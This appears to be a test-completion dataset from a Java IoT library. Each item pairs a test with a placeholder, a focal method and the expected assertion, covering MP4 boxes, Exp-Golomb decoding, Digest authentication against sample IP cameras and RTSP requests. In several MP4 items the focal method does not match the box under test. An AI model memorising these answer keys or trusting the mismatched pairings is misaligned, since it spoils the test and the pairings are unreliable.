"mp4StsdBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, (byte) 0xA2, 0x73, 0x74, (byte) 0x73, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,  0x00, 0x00, 0x00, (byte) 0x92, 0x61, 0x76, 0x63, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x04, 0x38, 0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x12, 0x62, 0x69, 0x6E, 0x65, //binelpro.ru 0x6C, 0x70, 0x72, 0x6F, 0x2E, 0x72, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // compressorname 0x00, 0x18, 0x11, 0x11,  0x00, 0x00, 0x00, 0x28, 0x61, 0x76, 0x63, 0x43, 0x01, 0x64, 0x00, 0x2A, (byte) 0xFF, (byte) 0xE1, 0x00, 0x11, 0x67, 0x64, 0x00, 0x2A, (byte) 0xAC, 0x2B, 0x50, 0x3C, 0x01, 0x13, (byte) 0xF2, (byte) 0xCD, (byte) 0xC0, 0x40, 0x40, 0x40, (byte) 0x80, 0x01, 0x00, 0x04, 0x68, (byte) 0xEE, 0x3C, (byte) 0xB0,  0x00, 0x00, 0x00, 0x14, 0x62, 0x74, 0x72, 0x74, 0x00, 0x1C, (byte) 0x9C, (byte) 0x80, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, }; Mp4StsdBox box = new Mp4StsdBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4Avc1Box() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, (byte) 0x92, 0x61, 0x76, 0x63, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x04, 0x38, 0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x12, 0x62, 0x69, 0x6E, 0x65, //binelpro.ru 0x6C, 0x70, 0x72, 0x6F, 0x2E, 0x72, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // compressorname 0x00, 0x18, 0x11, 0x11,  0x00, 0x00, 0x00, 0x28, 0x61, 0x76, 0x63, 0x43, 0x01, 0x64, 0x00, 0x2A, (byte) 0xFF, (byte) 0xE1, 0x00, 0x11, 0x67, 0x64, 0x00, 0x2A, (byte) 0xAC, 0x2B, 0x50, 0x3C, 0x01, 0x13, (byte) 0xF2, (byte) 0xCD, (byte) 0xC0, 0x40, 0x40, 0x40, (byte) 0x80, 0x01, 0x00, 0x04, 0x68, (byte) 0xEE, 0x3C, (byte) 0xB0,  0x00, 0x00, 0x00, 0x14, 0x62, 0x74, 0x72, 0x74, 0x00, 0x1C, (byte) 0x9C, (byte) 0x80, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, }; Mp4Avc1Box box = new Mp4Avc1Box(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4AvcCBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x28, 0x61, 0x76, 0x63, 0x43, 0x01, 0x64, 0x00, 0x2A, (byte) 0xFF, (byte) 0xE1, 0x00, 0x11, 0x67, 0x64, 0x00, 0x2A, (byte) 0xAC, 0x2B, 0x50, 0x3C, 0x01, 0x13, (byte) 0xF2, (byte) 0xCD, (byte) 0xC0, 0x40, 0x40, 0x40, (byte) 0x80, 0x01, 0x00, 0x04, 0x68, (byte) 0xEE, 0x3C, (byte) 0xB0, }; Mp4AvcCBox box = new Mp4AvcCBox(this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4BtrtBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x14, 0x62, 0x74, 0x72, 0x74, 0x00, 0x1C, (byte) 0x9C, (byte) 0x80, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, 0x00, 0x2D, (byte) 0xC6, (byte) 0xC0, }; Mp4BtrtBox box = new Mp4BtrtBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4SttsBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x74, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4SttsBox box = new Mp4SttsBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4StscBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x73, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4StscBox box = new Mp4StscBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4StszBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x14, 0x73, 0x74, 0x73, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4StszBox box = new Mp4StszBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4StcoBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x10, 0x73, 0x74, 0x63, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; Mp4StcoBox box = new Mp4StcoBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MvexBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x28, 0x6D, 0x76, 0x65, 0x78,  0x00, 0x00, 0x00, 0x20, 0x74, 0x72, 0x65, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, }; Mp4MvexBox box = new Mp4MvexBox(Collections.singletonList(this.trackInfo)); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4TrexBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x20, 0x74, 0x72, 0x65, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, }; Mp4TrexBox box = new Mp4TrexBox(1); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); ByteWriteBuff buff = ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mvhdBox.toByteArray()); this.trakBoxes.forEach(x -> buff.putBytes(x.toByteArray())); buff.putBytes(this.mvexBox.toByteArray()); return buff.getData(); }"	assertArrayEquals(expect, box.toByteArray())
"readNBit() { byte[] data = new byte[]{0x0F, 0x00}; ExpGolomb expGolomb = new ExpGolomb(data); long actual = expGolomb.readNBit(9); ""<AssertPlaceHolder>""; }
readNBit(int size) { if (size > 32) { throw new IllegalArgumentException(""size > 32""); }  long res = 0; for (int i = 0; i < size; i++) { res <<= 1; res |= this.read1Bit(); } return res; }"	assertEquals(30, actual)
"skipLZ() { byte[] data = new byte[]{0x0F, 0x00}; ExpGolomb expGolomb = new ExpGolomb(data); int actual = expGolomb.skipLZ(); ""<AssertPlaceHolder>""; }
skipLZ() { int count = 0; while (this.read1Bit() == 0) { count++; } return count; }"	assertEquals(4, actual)
"skipUE() { byte[] data = new byte[]{0x0F, 0x00}; ExpGolomb expGolomb = new ExpGolomb(data); expGolomb.skipUE(); ""<AssertPlaceHolder>""; }
skipUE() { int count = this.skipLZ(); this.readNBit(1 + count); }"	assertEquals(2, expGolomb.getBitIndex())
"skipSE() { byte[] data = new byte[]{0x0F, 0x00}; ExpGolomb expGolomb = new ExpGolomb(data); expGolomb.skipSE(); ""<AssertPlaceHolder>""; }
skipSE() { int count = this.skipLZ(); this.readNBit(1 + count); }"	assertEquals(2, expGolomb.getBitIndex())
"readBoolean() { byte[] data = new byte[]{0x0F, 0x00}; ExpGolomb expGolomb = new ExpGolomb(data); boolean actual = expGolomb.readBoolean(); ""<AssertPlaceHolder>""; }
readBoolean() { return this.read1Bit() == 1; }"	assertFalse(actual)
"readUE() { byte[] data = new byte[]{0x0F, 0x00}; ExpGolomb expGolomb = new ExpGolomb(data); int actual = expGolomb.readUE(); ""<AssertPlaceHolder>""; }
readUE() { int count = this.skipLZ(); return (int) ((1 << count) - 1 + this.readNBit(count)); }"	assertEquals(29, actual)
"readSE() { byte[] data = new byte[]{0x0F, 0x00}; ExpGolomb expGolomb = new ExpGolomb(data); int actual = expGolomb.readSE(); ""<AssertPlaceHolder>""; }
readSE() { int value = this.readUE(); int sign = ((value & 0x01) << 1) - 1; return ((value >> 1) + (value & 0x01)) * sign; }"	assertEquals(15, actual)
"createResponse() { String expect = ""Basic YWRtaW46MTIzNDU2""; UsernamePasswordCredential credential = new UsernamePasswordCredential(""admin"", ""123456""); BasicAuthenticator authenticator = new BasicAuthenticator(credential); String actual = authenticator.createResponse(); ""<AssertPlaceHolder>""; }
createResponse() { String src = String.format(""%s:%s"", this.credential.getUsername(), this.credential.getPassword()); return this.name + "" "" + this.encoder.encodeToString(src.getBytes(StandardCharsets.UTF_8)); }"	assertEquals(expect, actual)
"createResponse() { String expect = ""Digest username=""Mufasa"", realm=""testrealm@host.com"", nonce=""dcd98b7102dd2f0e8b11d0f600bfb0c093"", uri=""/dir/index.html"", response=""6629fae49393a05397450978507c4ef1"", qop=auth, nc=00000001, cnonce=""0a4f113b""""; UsernamePasswordCredential credential = new UsernamePasswordCredential(""Mufasa"", ""Circle Of Life""); DigestAuthenticator authenticator = new DigestAuthenticator(credential); authenticator.addServerInfoByString(""Digest realm=""testrealm@host.com"", qop=""auth"", nonce=""dcd98b7102dd2f0e8b11d0f600bfb0c093""""); authenticator.addClientInfo(""/dir/index.html"", ""GET"", ""0a4f113b""); String actual = authenticator.createResponse(); ""<AssertPlaceHolder>""; }
createResponse() { if (this.realm == null || this.realm.equals("""")) { throw new AuthenticationException(""realm is empty""); } if (this.nonce == null || this.nonce.equals("""")) { throw new AuthenticationException(""nonce is empty""); } if (this.uri == null || this.uri.equals("""")) { throw new AuthenticationException(""uri is empty""); } if (this.method == null || this.method.equals("""")) { throw new AuthenticationException(""method is empty""); } StringBuilder sb = new StringBuilder(); sb.append(DIGEST_NAME).append("" "") .append(""username="""").append(this.credential.getUsername()).append("""", "") .append(""realm="""").append(this.realm).append("""", "") .append(""nonce="""").append(this.nonce).append("""", "") .append(""uri="""").append(this.uri).append("""", ""); if (this.qop == null || this.qop.equals("""")) { sb.append(""response="""").append(this.calculateResponseString()).append(""""""); } else { sb.append(""response="""").append(this.calculateResponseString()).append("""", "") .append(""qop="").append(this.qop).append("", "") .append(""nc="").append(String.format(""%08X"", this.nc)).append("", "") .append(""cnonce="""").append(this.cnonce).append(""""""); } return sb.toString(); }"	assertEquals(expect, actual)
"createResponse1() { String expect = ""Digest username=""q"", realm=""test"", nonce=""N6yEOiDGTvOx9hwloHW7AQ=="", uri=""/portal/applications"", response=""bc3662d7309bdf68b5f6684647bd17e2"", qop=auth, nc=00000001, cnonce=""04fefcb40dae7db4""""; UsernamePasswordCredential credential = new UsernamePasswordCredential(""q"", ""q""); DigestAuthenticator authenticator = new DigestAuthenticator(credential); authenticator.addServerInfo(""test"", ""auth"", ""N6yEOiDGTvOx9hwloHW7AQ=="", false); authenticator.addClientInfo(""/portal/applications"", ""GET"", ""04fefcb40dae7db4""); String actual = authenticator.createResponse(); ""<AssertPlaceHolder>"";  }
createResponse() { if (this.realm == null || this.realm.equals("""")) { throw new AuthenticationException(""realm is empty""); } if (this.nonce == null || this.nonce.equals("""")) { throw new AuthenticationException(""nonce is empty""); } if (this.uri == null || this.uri.equals("""")) { throw new AuthenticationException(""uri is empty""); } if (this.method == null || this.method.equals("""")) { throw new AuthenticationException(""method is empty""); } StringBuilder sb = new StringBuilder(); sb.append(DIGEST_NAME).append("" "") .append(""username="""").append(this.credential.getUsername()).append("""", "") .append(""realm="""").append(this.realm).append("""", "") .append(""nonce="""").append(this.nonce).append("""", "") .append(""uri="""").append(this.uri).append("""", ""); if (this.qop == null || this.qop.equals("""")) { sb.append(""response="""").append(this.calculateResponseString()).append(""""""); } else { sb.append(""response="""").append(this.calculateResponseString()).append("""", "") .append(""qop="").append(this.qop).append("", "") .append(""nc="").append(String.format(""%08X"", this.nc)).append("", "") .append(""cnonce="""").append(this.cnonce).append(""""""); } return sb.toString(); }"	assertEquals(expect, actual)
"createResponse2() { String expect = ""Digest username=""admin"", realm=""IP Camera(10789)"", nonce=""6b9a455aec675b8db81a9ceb802e4eb8"", uri=""rtsp://10.3.8.202:554"", response=""876fcfac745c91bb7dd89faa660891ea""""; UsernamePasswordCredential credential = new UsernamePasswordCredential(""admin"", ""12345""); DigestAuthenticator authenticator = new DigestAuthenticator(credential); authenticator.addServerInfo(""IP Camera(10789)"", """", ""6b9a455aec675b8db81a9ceb802e4eb8"", false); authenticator.addClientInfo(""rtsp://10.3.8.202:554"", ""DESCRIBE""); String actual = authenticator.createResponse(); ""<AssertPlaceHolder>""; }
createResponse() { if (this.realm == null || this.realm.equals("""")) { throw new AuthenticationException(""realm is empty""); } if (this.nonce == null || this.nonce.equals("""")) { throw new AuthenticationException(""nonce is empty""); } if (this.uri == null || this.uri.equals("""")) { throw new AuthenticationException(""uri is empty""); } if (this.method == null || this.method.equals("""")) { throw new AuthenticationException(""method is empty""); } StringBuilder sb = new StringBuilder(); sb.append(DIGEST_NAME).append("" "") .append(""username="""").append(this.credential.getUsername()).append("""", "") .append(""realm="""").append(this.realm).append("""", "") .append(""nonce="""").append(this.nonce).append("""", "") .append(""uri="""").append(this.uri).append("""", ""); if (this.qop == null || this.qop.equals("""")) { sb.append(""response="""").append(this.calculateResponseString()).append(""""""); } else { sb.append(""response="""").append(this.calculateResponseString()).append("""", "") .append(""qop="").append(this.qop).append("", "") .append(""nc="").append(String.format(""%08X"", this.nc)).append("", "") .append(""cnonce="""").append(this.cnonce).append(""""""); } return sb.toString(); }"	assertEquals(expect, actual)
"createResponse3() { String expect = ""Digest username=""admin"", realm=""IP Camera(10789)"", nonce=""6b9a455aec675b8db81a9ceb802e4eb8"", uri=""rtsp://10.3.8.202:554"", response=""876fcfac745c91bb7dd89faa660891ea""""; UsernamePasswordCredential credential = new UsernamePasswordCredential(""admin"", ""12345""); DigestAuthenticator authenticator = new DigestAuthenticator(credential); authenticator.addServerInfoByString(""Digest realm=""IP Camera(10789)"", nonce=""6b9a455aec675b8db81a9ceb802e4eb8"", stale=""FALSE""""); authenticator.addClientInfo(""rtsp://10.3.8.202:554"", ""DESCRIBE""); String actual = authenticator.createResponse(); ""<AssertPlaceHolder>""; }
createResponse() { if (this.realm == null || this.realm.equals("""")) { throw new AuthenticationException(""realm is empty""); } if (this.nonce == null || this.nonce.equals("""")) { throw new AuthenticationException(""nonce is empty""); } if (this.uri == null || this.uri.equals("""")) { throw new AuthenticationException(""uri is empty""); } if (this.method == null || this.method.equals("""")) { throw new AuthenticationException(""method is empty""); } StringBuilder sb = new StringBuilder(); sb.append(DIGEST_NAME).append("" "") .append(""username="""").append(this.credential.getUsername()).append("""", "") .append(""realm="""").append(this.realm).append("""", "") .append(""nonce="""").append(this.nonce).append("""", "") .append(""uri="""").append(this.uri).append("""", ""); if (this.qop == null || this.qop.equals("""")) { sb.append(""response="""").append(this.calculateResponseString()).append(""""""); } else { sb.append(""response="""").append(this.calculateResponseString()).append("""", "") .append(""qop="").append(this.qop).append("", "") .append(""nc="").append(String.format(""%08X"", this.nc)).append("", "") .append(""cnonce="""").append(this.cnonce).append(""""""); } return sb.toString(); }"	assertEquals(expect, actual)
"createResponse4() { String expect = ""Digest username=""admin"", realm=""IP Camera(G5366)"", nonce=""00ea0e5bc0d4bee565d77d40502f9229"","" + "" uri=""rtsp://192.168.3.142:554/h264/ch1/main/av_stream"", response=""f5592b62173d44ecc24738e0b0ed8dfd""""; UsernamePasswordCredential credential = new UsernamePasswordCredential(""admin"", ""kilox1234""); DigestAuthenticator authenticator = new DigestAuthenticator(credential); authenticator.addServerInfoByString(""Digest realm=""IP Camera(G5366)"", nonce=""00ea0e5bc0d4bee565d77d40502f9229"", stale=""FALSE""""); authenticator.addClientInfo(""rtsp://192.168.3.142:554/h264/ch1/main/av_stream"", ""DESCRIBE""); String actual = authenticator.createResponse(); ""<AssertPlaceHolder>""; }
createResponse() { if (this.realm == null || this.realm.equals("""")) { throw new AuthenticationException(""realm is empty""); } if (this.nonce == null || this.nonce.equals("""")) { throw new AuthenticationException(""nonce is empty""); } if (this.uri == null || this.uri.equals("""")) { throw new AuthenticationException(""uri is empty""); } if (this.method == null || this.method.equals("""")) { throw new AuthenticationException(""method is empty""); } StringBuilder sb = new StringBuilder(); sb.append(DIGEST_NAME).append("" "") .append(""username="""").append(this.credential.getUsername()).append("""", "") .append(""realm="""").append(this.realm).append("""", "") .append(""nonce="""").append(this.nonce).append("""", "") .append(""uri="""").append(this.uri).append("""", ""); if (this.qop == null || this.qop.equals("""")) { sb.append(""response="""").append(this.calculateResponseString()).append(""""""); } else { sb.append(""response="""").append(this.calculateResponseString()).append("""", "") .append(""qop="").append(this.qop).append("", "") .append(""nc="").append(String.format(""%08X"", this.nc)).append("", "") .append(""cnonce="""").append(this.cnonce).append(""""""); } return sb.toString(); }"	assertEquals(expect, actual)
"rtspOptionRequestTest() { String expect = ""OPTIONS rtsp://10.3.8.202:554 RTSP/1.0\r\n"" + ""CSeq: 0\r\n"" + ""User-Agent: IOT-COMMUNICATION\r\n"" + ""\r\n""; URI uri = URI.create(""rtsp://10.3.8.202:554""); RtspOptionRequest request = new RtspOptionRequest(uri); request.setCSeq(0); String actual = request.toObjectString(); ""<AssertPlaceHolder>""; }
toObjectString() { StringBuilder sb = new StringBuilder(); this.addRequestLine(sb); this.addGeneralHeader(sb); this.addCommonRequestHeader(sb); this.addRequestHeader(sb); this.addEntityHeader(sb); sb.append(CRLF); this.addMessageBody(sb); return sb.toString(); }"	assertEquals(expect, actual)
"rtspSetupRequestTest() {  String expect = ""SETUP rtsp://10.3.8.202:554/trackID=1 RTSP/1.0\r\n"" + ""CSeq: 0\r\n"" + ""Authorization: Digest username=""admin"", realm=""IP Camera(10789)"", nonce=""6b9a455aec675b8db81a9ceb802e4eb8"", uri=""rtsp://10.3.8.202:554"", response=""56d55b92e8b41aa6cc1a68a5c2e2de15""\r\n"" + ""User-Agent: IOT-COMMUNICATION\r\n"" + ""Transport: RTP/AVP;unicast;client_port=57844-57845\r\n"" + ""\r\n"";  URI uri = URI.create(""rtsp://10.3.8.202:554/trackID=1""); RtspTransport transport = RtspTransport.fromString(""RTP/AVP;unicast;client_port=57844-57845""); RtspSetupRequest request = new RtspSetupRequest(uri, transport, this.authenticator); request.setCSeq(0); String actual = request.toObjectString(); ""<AssertPlaceHolder>""; }
toObjectString() { StringBuilder sb = new StringBuilder(); this.addRequestLine(sb); this.addGeneralHeader(sb); this.addCommonRequestHeader(sb); this.addRequestHeader(sb); this.addEntityHeader(sb); sb.append(CRLF); this.addMessageBody(sb); return sb.toString(); }"	assertEquals(expect, actual)
"rtspPlayRequestTest() { String expect = ""PLAY rtsp://10.3.8.202:554/ RTSP/1.0\r\n"" + ""CSeq: 0\r\n"" + ""Authorization: Digest username=""admin"", realm=""IP Camera(10789)"", nonce=""6b9a455aec675b8db81a9ceb802e4eb8"", uri=""rtsp://10.3.8.202:554"", response=""56d55b92e8b41aa6cc1a68a5c2e2de15""\r\n"" + ""User-Agent: IOT-COMMUNICATION\r\n"" + ""Session: 1273222592\r\n"" + ""Range: npt=0.000-\r\n"" + ""\r\n""; URI uri = URI.create(""rtsp://10.3.8.202:554/""); RtspRange range = new RtspRangeNpt(""0.000""); RtspPlayRequest request = new RtspPlayRequest(uri, ""1273222592"", range, this.authenticator); request.setCSeq(0); String actual = request.toObjectString(); ""<AssertPlaceHolder>""; }
toObjectString() { StringBuilder sb = new StringBuilder(); this.addRequestLine(sb); this.addGeneralHeader(sb); this.addCommonRequestHeader(sb); this.addRequestHeader(sb); this.addEntityHeader(sb); sb.append(CRLF); this.addMessageBody(sb); return sb.toString(); }"	assertEquals(expect, actual)
"rtspPauseRequestTest() { String expect = ""PAUSE rtsp://10.3.8.202:554/ RTSP/1.0\r\n"" + ""CSeq: 0\r\n"" + ""Authorization: Digest username=""admin"", realm=""IP Camera(10789)"", nonce=""6b9a455aec675b8db81a9ceb802e4eb8"", uri=""rtsp://10.3.8.202:554"", response=""56d55b92e8b41aa6cc1a68a5c2e2de15""\r\n"" + ""User-Agent: IOT-COMMUNICATION\r\n"" + ""Session: 1273222592\r\n"" + ""\r\n""; URI uri = URI.create(""rtsp://10.3.8.202:554/""); RtspPauseRequest request = new RtspPauseRequest(uri, ""1273222592"", this.authenticator); request.setCSeq(0); String actual = request.toObjectString(); ""<AssertPlaceHolder>""; }
toObjectString() { StringBuilder sb = new StringBuilder(); this.addRequestLine(sb); this.addGeneralHeader(sb); this.addCommonRequestHeader(sb); this.addRequestHeader(sb); this.addEntityHeader(sb); sb.append(CRLF); this.addMessageBody(sb); return sb.toString(); }"	assertEquals(expect, actual)
"rtspTeardownRequestTest() { String expect = ""TEARDOWN rtsp://10.3.8.202:554/ RTSP/1.0\r\n"" + ""CSeq: 0\r\n"" + ""Authorization: Digest username=""admin"", realm=""IP Camera(10789)"", nonce=""6b9a455aec675b8db81a9ceb802e4eb8"", uri=""rtsp://10.3.8.202:554"", response=""56d55b92e8b41aa6cc1a68a5c2e2de15""\r\n"" + ""User-Agent: IOT-COMMUNICATION\r\n"" + ""Session: 1273222592\r\n"" + ""\r\n""; URI uri = URI.create(""rtsp://10.3.8.202:554/""); RtspTeardownRequest request = new RtspTeardownRequest(uri, ""1273222592"", this.authenticator); request.setCSeq(0); String actual = request.toObjectString(); ""<AssertPlaceHolder>""; }
toObjectString() { StringBuilder sb = new StringBuilder(); this.addRequestLine(sb); this.addGeneralHeader(sb); this.addCommonRequestHeader(sb); this.addRequestHeader(sb); this.addEntityHeader(sb); sb.append(CRLF); this.addMessageBody(sb); return sb.toString(); }"	assertEquals(expect, actual)
"rtspClientPortTransportToString1() { String expect = ""RTP/AVP;unicast;client_port=60802-60803""; RtspClientPortTransport transport = new RtspClientPortTransport(); transport.setProtocol(""RTP/AVP""); transport.setCastMode(""unicast""); transport.setRtpClientPort(60802); transport.setRtcpClientPort(60803); ""<AssertPlaceHolder>""; }
toString() { if (this.protocol == null || this.protocol.equals("""")) { throw new RtspCommException(""protocol of RtspTransport is null or empty""); } if (this.castMode == null || this.castMode.equals("""")) { throw new RtspCommException(""castMode of RtspTransport is null or empty""); } List<String> res = new ArrayList<>(); res.add(this.protocol); res.add(this.castMode);  if (this.ssrc != null && !this.ssrc.equals("""")) { res.add(String.format(""ssrc=%s"", this.ssrc)); } if (this.mode != null && !this.mode.equals("""")) { res.add(String.format(""mode=""%s"""", this.mode)); } return String.join("";"", res); }"	assertEquals(expect, transport.toString())
"rtspInterleavedTransportToString() { String expect = ""RTP/AVP/TCP;unicast;interleaved=0-1""; RtspInterleavedTransport transport = new RtspInterleavedTransport(); transport.setProtocol(""RTP/AVP/TCP""); transport.setCastMode(""unicast""); transport.setInterleaved1(0); transport.setInterleaved2(1); ""<AssertPlaceHolder>""; }
toString() { if (this.protocol == null || this.protocol.equals("""")) { throw new RtspCommException(""protocol of RtspTransport is null or empty""); } if (this.castMode == null || this.castMode.equals("""")) { throw new RtspCommException(""castMode of RtspTransport is null or empty""); } List<String> res = new ArrayList<>(); res.add(this.protocol); res.add(this.castMode);  if (this.ssrc != null && !this.ssrc.equals("""")) { res.add(String.format(""ssrc=%s"", this.ssrc)); } if (this.mode != null && !this.mode.equals("""")) { res.add(String.format(""mode=""%s"""", this.mode)); } return String.join("";"", res); }"	assertEquals(expect, transport.toString())
"writeRecombination1() { int[] data = new int[]{2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2}; int[] expect = new int[]{2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2}; List<Integer> src = Arrays.stream(data).boxed().collect(Collectors.toList()); List<S7ComGroup> recombination = S7SequentialGroupAlg.writeRecombination(src, 228, 17); int[] actual = recombination.stream().flatMap(x -> x.getItems().stream()) .mapToInt(S7ComItem::getRipeSize).toArray(); ""<AssertPlaceHolder>""; }
writeRecombination(List<Integer> src, int targetSize, int extraSize) { List<S7ComGroup> groupList = new LinkedList<>(); S7ComGroup group = new S7ComGroup(); groupList.add(group); int sum = 0; for (int i = 0; i < src.size(); i++) { int number = src.get(i); int offset = 0; while (number > 0) { S7ComItem item = new S7ComItem(i, src.get(i), offset, 0, extraSize, 0); if (sum + number + item.getExtraSize() > targetSize) { item.setRipeSize(targetSize - sum - item.getExtraSize()); } else { item.setRipeSize(number); } number -= item.getRipeSize(); offset += item.getRipeSize(); sum += item.getTotalLength(); group.add(item); if (sum + extraSize >= targetSize) { group = new S7ComGroup(); groupList.add(group); sum = 0; } } } return groupList.stream().filter(x -> !x.getItems().isEmpty()).collect(Collectors.toList()); }"	assertArrayEquals(expect, actual)
